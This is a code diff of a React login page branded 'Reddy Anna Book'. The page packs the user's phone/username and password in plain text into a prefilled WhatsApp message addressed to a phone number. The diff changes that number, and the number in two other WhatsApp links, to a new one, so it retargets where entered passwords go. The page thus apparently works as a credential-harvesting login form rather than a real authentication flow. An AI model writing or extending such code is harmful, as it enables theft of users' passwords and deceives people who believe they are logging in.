@@ -41,7 +41,7 @@ export default function LoginPage() {
       const message = encodeURIComponent(
         `Hello Reddy Anna Book, I want to login to my account.\nPhone/Username: ${phone}\nPassword: ${password}`
       );
-      window.open(`https://wa.me/918796686330?text=${message}`, "_blank");
+      window.open(`https://wa.me/918360750829?text=${message}`, "_blank");
       setSuccess(false);
     }, 1200);
   };
@@ -103,7 +103,7 @@ export default function LoginPage() {
                   Password
                 </label>
                 <a
-                  href="https://wa.me/918796686330?text=Hello,%20I%20forgot%20my%20Reddy%20Anna%20Login%20Password.%20Please%20help%20me%20reset%20it."
+                  href="https://wa.me/918360750829?text=Hello,%20I%20forgot%20my%20Reddy%20Anna%20Login%20Password.%20Please%20help%20me%20reset%20it."
                   target="_blank"
                   rel="noopener noreferrer"
                   className="text-ra-gold hover:underline text-[12px] font-bold tracking-wide"
@@ -162,7 +162,7 @@ export default function LoginPage() {
               </div>
 
               <a
-                href="https://wa.me/918796686330?text=Hello%20Reddy%20Anna%20Book,%20I%20want%20to%20login%20to%20my%20account%20instantly."
+                href="https://wa.me/918360750829?text=Hello%20Reddy%20Anna%20Book,%20I%20want%20to%20login%20to%20my%20account%20instantly."
                 target="_blank"
                 rel="noopener noreferrer"
                 className="w-full py-3 bg-[#25D366] hover:bg-[#20ba5a] text-white font-extrabold rounded-lg shadow-md transition-all uppercase tracking-widest text-[13px] flex items-center justify-center gap-2"
